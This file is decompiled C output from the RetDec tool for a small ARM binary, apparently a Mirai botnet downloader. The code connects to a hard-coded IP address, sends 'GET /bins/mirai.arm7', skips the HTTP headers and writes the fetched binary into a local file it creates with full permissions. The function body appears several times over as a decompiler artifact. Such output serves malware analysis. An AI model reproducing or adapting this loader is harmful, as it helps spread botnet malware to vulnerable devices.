//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com
// Copyright (c) 2018 Retargetable Decompiler <info@retdec.com>
//

#include <stdbool.h>
#include <stdint.h>

// ------------------- Function Prototypes --------------------

int32_t entry_point(void);
int32_t function_80c0(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_80e4(int32_t a1);
int32_t function_8104(int32_t a1);
int32_t function_8124(int32_t a1, int32_t a2, int32_t a3);
int32_t function_8150(int32_t a1, int32_t a2, int32_t a3);
int32_t function_8180(int32_t a1, int32_t a2, int32_t a3);
int32_t function_81ac(int32_t a1, int32_t a2, int32_t a3);
int32_t function_81d8(int32_t a1, int32_t a2, int32_t a3);
int32_t function_8208(void);
int32_t function_8390(int32_t * a1, int32_t a2);
int32_t function_83b0(int32_t a1, uint32_t result);
int32_t function_8408(int32_t result);
int32_t function_8410(void);

// ------------------------ Functions -------------------------

// Address range: 0x80c0 - 0x80e3
int32_t function_80c0(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    int32_t v1 = 8;
    int32_t v2 = -0x1ad21ffc;
    uint32_t v3 = 0x10000 * a2 | 0x1000000 * a1 | a4 | 256 * a3; // 0x80c8
    return 0x1000000 * a4 | 0x10000 * a3 | v3 / 0x1000000 | (v3 & 0xff0000) / 256;
}

// Address range: 0x80e4 - 0x8103
int32_t function_80e4(int32_t a1) {
    int32_t v1;
    int32_t v2;
    // 0x80e4
    return function_83b0(1, a1);
}

// Address range: 0x8104 - 0x8123
int32_t function_8104(int32_t a1) {
    int32_t v1;
    int32_t v2;
    // 0x8104
    return function_83b0(6, a1);
}

// Address range: 0x8124 - 0x814f
int32_t function_8124(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1;
    int32_t v2;
    // 0x8124
    return function_83b0(5, a1);
}

// Address range: 0x8150 - 0x817f
int32_t function_8150(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1;
    int32_t v2;
    // 0x8150
    return function_83b0(283, a1);
}

// Address range: 0x8180 - 0x81ab
int32_t function_8180(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1;
    int32_t v2;
    // 0x8180
    return function_83b0(4, a1);
}

// Address range: 0x81ac - 0x81d7
int32_t function_81ac(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1;
    int32_t v2;
    // 0x81ac
    return function_83b0(3, a1);
}

// Address range: 0x81d8 - 0x8207
int32_t function_81d8(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1;
    int32_t v2;
    // 0x81d8
    return function_83b0(281, a1);
}

// Address range: 0x8208 - 0x838f
int32_t function_8208(void) {
    int32_t v1;
    int32_t v2 = 0; // r8
    unsigned char v3; // 0x82205
    int32_t v4 = v3; // r6
    int32_t v5;
    int32_t v6; // r5
    int32_t v7; // r7
    int32_t v8; // bp-172
    char v9; // bp-25
    int32_t v10; // bp-44
    int32_t v11; // 0x82d0
    int32_t v12; // 0x8328
    int32_t v13; // 0x8288
    int32_t v14; // 0x82ac
    int32_t v15; // 0x8308
    int32_t v16; // 0x8338
    int32_t v17; // 0x833832
    int32_t v18; // 0x82e0
    int32_t v19; // 0x831c
    if (v3 != 0) {
        int32_t v20 = (int32_t)"rm7" + 1; // 0x8228
        int32_t v21 = 1; // 0x821c
        v2 = v21;
        unsigned char v22; // 0x8220
        v4 = v22;
        while (v22 != 0) {
            // 0x821c
            v20++;
            v21++;
            v2 = v21;
            v4 = v22;
            // continue -> 0x821c
        }
        // 0x8230
        function_8180(1, (int32_t)"MIRAI\n", 6);
        v10 = 2;
        function_80c0(185, 165, 29, 62, 2, 0x5000);
        v7 = function_8124((int32_t)"Wordmemy", 577, 511);
        v13 = function_81d8(2, 1, v4);
        if (v13 == -1) {
            // .thread
            v6 = -1;
            // branch -> bb26
        } else {
            // bb
            v6 = v13;
            if (v7 != -1) {
                // bb27
                __pseudo_cond_branch(false, (int32_t)&v5);
                v14 = function_8150(v6, (int32_t)&v10, 16);
                if (v14 < 0) {
                    // 0x82b8
                    function_8180(1, (int32_t)"NIF\n", 4);
                    function_80e4(-v14);
                    // branch -> 0x82d0
                }
                // 0x82d0
                v11 = v2 + 29;
                v18 = function_8180(v6, (int32_t)"GET /bins/mirai.arm7 HTTP/1.0\r\n\r\n", v11);
                if (v18 != v11) {
                    // bb28
                    // branch -> bb29
                }
                // bb29
                __pseudo_cond_branch(v18 != v11, (int32_t)&v5);
                v15 = function_81ac(v6, (int32_t)&v9, 1);
                __pseudo_cond_branch(v15 != 1, (int32_t)&v5);
                v19 = 256 * v4 | (int32_t)v9;
                // branch -> 0x82fc
                while (v19 != 0xd0a0d0a) {
                    // 0x82fc
                    v15 = function_81ac(v6, (int32_t)&v9, 1);
                    __pseudo_cond_branch(v15 != 1, (int32_t)&v5);
                    v19 = 256 * v19 | (int32_t)v9;
                    // continue -> 0x82fc
                }
                // 0x8328
                v12 = &v8;
                v17 = function_81ac(v6, v12, 128);
                if (v17 < 1) {
                    // 0x8354
                    function_8104(v6);
                    function_8104(v7);
                    function_8180(1, (int32_t)"FIN\n", 4);
                    return function_80e4(5);
                }
                function_8180(v7, v12, v17);
                v16 = function_81ac(v6, v12, 128);
                while (v16 >= 1) {
                    // 0x834c
                    function_8180(v7, v12, v16);
                    v16 = function_81ac(v6, v12, 128);
                    // continue -> 0x834c
                }
                // 0x8354
                function_8104(v6);
                function_8104(v7);
                function_8180(1, (int32_t)"FIN\n", 4);
                return function_80e4(5);
            }
        }
        // bb26
        // branch -> bb27
        // bb27
        __pseudo_cond_branch(true, (int32_t)&v5);
        v14 = function_8150(v6, (int32_t)&v10, 16);
        if (v14 < 0) {
            // 0x82b8
            function_8180(1, (int32_t)"NIF\n", 4);
            function_80e4(-v14);
            // branch -> 0x82d0
        }
        // 0x82d0
        v11 = v2 + 29;
        v18 = function_8180(v6, (int32_t)"GET /bins/mirai.arm7 HTTP/1.0\r\n\r\n", v11);
        if (v18 != v11) {
            // bb28
            // branch -> bb29
        }
        // bb29
        __pseudo_cond_branch(v18 != v11, (int32_t)&v5);
        v15 = function_81ac(v6, (int32_t)&v9, 1);
        __pseudo_cond_branch(v15 != 1, (int32_t)&v5);
        v19 = 256 * v4 | (int32_t)v9;
        // branch -> 0x82fc
        while (v19 != 0xd0a0d0a) {
            // 0x82fc
            v15 = function_81ac(v6, (int32_t)&v9, 1);
            __pseudo_cond_branch(v15 != 1, (int32_t)&v5);
            v19 = 256 * v19 | (int32_t)v9;
            // continue -> 0x82fc
        }
        // 0x8328
        v12 = &v8;
        v17 = function_81ac(v6, v12, 128);
        if (v17 < 1) {
            // 0x8354
            function_8104(v6);
            function_8104(v7);
            function_8180(1, (int32_t)"FIN\n", 4);
            return function_80e4(5);
        }
        function_8180(v7, v12, v17);
        v16 = function_81ac(v6, v12, 128);
        while (v16 >= 1) {
            // 0x834c
            function_8180(v7, v12, v16);
            v16 = function_81ac(v6, v12, 128);
            // continue -> 0x834c
        }
        // 0x8354
        function_8104(v6);
        function_8104(v7);
        function_8180(1, (int32_t)"FIN\n", 4);
        return function_80e4(5);
    }
    // 0x8230
    function_8180(1, (int32_t)"MIRAI\n", 6);
    v10 = 2;
    function_80c0(185, 165, 29, 62, 2, 0x5000);
    v7 = function_8124((int32_t)"Wordmemy", 577, 511);
    v13 = function_81d8(2, 1, v4);
    if (v13 == -1) {
        // .thread
        v6 = -1;
        // branch -> bb26
        // bb26
        // branch -> bb27
        // bb27
        __pseudo_cond_branch(true, (int32_t)&v5);
        v14 = function_8150(v6, (int32_t)&v10, 16);
        if (v14 < 0) {
            // 0x82b8
            function_8180(1, (int32_t)"NIF\n", 4);
            function_80e4(-v14);
            // branch -> 0x82d0
        }
        // 0x82d0
        v11 = v2 + 29;
        v18 = function_8180(v6, (int32_t)"GET /bins/mirai.arm7 HTTP/1.0\r\n\r\n", v11);
        if (v18 != v11) {
            // bb28
            // branch -> bb29
        }
        // bb29
        __pseudo_cond_branch(v18 != v11, (int32_t)&v5);
        v15 = function_81ac(v6, (int32_t)&v9, 1);
        __pseudo_cond_branch(v15 != 1, (int32_t)&v5);
        v19 = 256 * v4 | (int32_t)v9;
        // branch -> 0x82fc
        while (v19 != 0xd0a0d0a) {
            // 0x82fc
            v15 = function_81ac(v6, (int32_t)&v9, 1);
            __pseudo_cond_branch(v15 != 1, (int32_t)&v5);
            v19 = 256 * v19 | (int32_t)v9;
            // continue -> 0x82fc
        }
        // 0x8328
        v12 = &v8;
        v17 = function_81ac(v6, v12, 128);
        if (v17 < 1) {
            // 0x8354
            function_8104(v6);
            function_8104(v7);
            function_8180(1, (int32_t)"FIN\n", 4);
            return function_80e4(5);
        }
        function_8180(v7, v12, v17);
        v16 = function_81ac(v6, v12, 128);
        while (v16 >= 1) {
            // 0x834c
            function_8180(v7, v12, v16);
            v16 = function_81ac(v6, v12, 128);
            // continue -> 0x834c
        }
        // 0x8354
        function_8104(v6);
        function_8104(v7);
        function_8180(1, (int32_t)"FIN\n", 4);
        return function_80e4(5);
    }
    // bb
    v6 = v13;
    if (v7 != -1) {
        // bb27
        __pseudo_cond_branch(false, (int32_t)&v5);
        v14 = function_8150(v6, (int32_t)&v10, 16);
        if (v14 < 0) {
            // 0x82b8
            function_8180(1, (int32_t)"NIF\n", 4);
            function_80e4(-v14);
            // branch -> 0x82d0
        }
        // 0x82d0
        v11 = v2 + 29;
        v18 = function_8180(v6, (int32_t)"GET /bins/mirai.arm7 HTTP/1.0\r\n\r\n", v11);
        if (v18 != v11) {
            // bb28
            // branch -> bb29
        }
        // bb29
        __pseudo_cond_branch(v18 != v11, (int32_t)&v5);
        v15 = function_81ac(v6, (int32_t)&v9, 1);
        __pseudo_cond_branch(v15 != 1, (int32_t)&v5);
        v19 = 256 * v4 | (int32_t)v9;
        // branch -> 0x82fc
        while (v19 != 0xd0a0d0a) {
            // 0x82fc
            v15 = function_81ac(v6, (int32_t)&v9, 1);
            __pseudo_cond_branch(v15 != 1, (int32_t)&v5);
            v19 = 256 * v19 | (int32_t)v9;
            // continue -> 0x82fc
        }
        // 0x8328
        v12 = &v8;
        v17 = function_81ac(v6, v12, 128);
        if (v17 < 1) {
            // 0x8354
            function_8104(v6);
            function_8104(v7);
            function_8180(1, (int32_t)"FIN\n", 4);
            return function_80e4(5);
        }
        function_8180(v7, v12, v17);
        v16 = function_81ac(v6, v12, 128);
        while (v16 >= 1) {
            // 0x834c
            function_8180(v7, v12, v16);
            v16 = function_81ac(v6, v12, 128);
            // continue -> 0x834c
        }
        // 0x8354
        function_8104(v6);
        function_8104(v7);
        function_8180(1, (int32_t)"FIN\n", 4);
        return function_80e4(5);
    }
    // bb26
    // branch -> bb27
    // bb27
    __pseudo_cond_branch(true, (int32_t)&v5);
    v14 = function_8150(v6, (int32_t)&v10, 16);
    if (v14 < 0) {
        // 0x82b8
        function_8180(1, (int32_t)"NIF\n", 4);
        function_80e4(-v14);
        // branch -> 0x82d0
    }
    // 0x82d0
    v11 = v2 + 29;
    v18 = function_8180(v6, (int32_t)"GET /bins/mirai.arm7 HTTP/1.0\r\n\r\n", v11);
    if (v18 != v11) {
        // bb28
        // branch -> bb29
    }
    // bb29
    __pseudo_cond_branch(v18 != v11, (int32_t)&v5);
    v15 = function_81ac(v6, (int32_t)&v9, 1);
    __pseudo_cond_branch(v15 != 1, (int32_t)&v5);
    v19 = 256 * v4 | (int32_t)v9;
    // branch -> 0x82fc
    while (v19 != 0xd0a0d0a) {
        // 0x82fc
        v15 = function_81ac(v6, (int32_t)&v9, 1);
        __pseudo_cond_branch(v15 != 1, (int32_t)&v5);
        v19 = 256 * v19 | (int32_t)v9;
        // continue -> 0x82fc
    }
    // 0x8328
    v12 = &v8;
    v17 = function_81ac(v6, v12, 128);
    if (v17 < 1) {
        // 0x8354
        function_8104(v6);
        function_8104(v7);
        function_8180(1, (int32_t)"FIN\n", 4);
        return function_80e4(5);
    }
    function_8180(v7, v12, v17);
    v16 = function_81ac(v6, v12, 128);
    while (v16 >= 1) {
        // 0x834c
        function_8180(v7, v12, v16);
        v16 = function_81ac(v6, v12, 128);
        // continue -> 0x834c
    }
    // 0x8354
    function_8104(v6);
    function_8104(v7);
    function_8180(1, (int32_t)"FIN\n", 4);
    return function_80e4(5);
}

// Address range: 0x8390 - 0x8397
int32_t function_8390(int32_t * a1, int32_t a2) {
    int32_t v1;
    int32_t v2;
    int32_t v3 = (int32_t)a1;
    int32_t result = v3; // 0x8394
    bool v4;
    if (v4) {
        // bb
        result = (a2 / 16 & v3) - 0x839c;
        // branch -> .thread
    }
    // .thread
    return result;
}

// Address range: 0x83ac - 0x83af
int32_t entry_point(void) {
    int32_t v1;
    int32_t v2;
    // entry
    return function_8208();
}

// Address range: 0x83b0 - 0x8407
int32_t function_83b0(int32_t a1, uint32_t result) {
    int32_t v1;
    int32_t v2;
    // 0x83b0
    if (result <= 0xffffefff) {
        // bb
        return result;
    }
    // 0x83e0
    function_8410();
    return -1;
}

// Address range: 0x8408 - 0x840f
int32_t function_8408(int32_t result) {
    int32_t v1;
    int32_t v2;
    // 0x8408
    bool v3;
    if (v3) {
        // bb
        // branch -> bb1
    }
    // bb1
    return result;
}

// Address range: 0x8410 - 0x841f
int32_t function_8410(void) {
    int32_t v1;
    int32_t v2;
    // 0x8410
    __pseudo_branch(-0xf020);
    return -0xf001;
}

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: gc
// Detected functions: 14
// Decompilation date: 2018-03-25 06:20:37
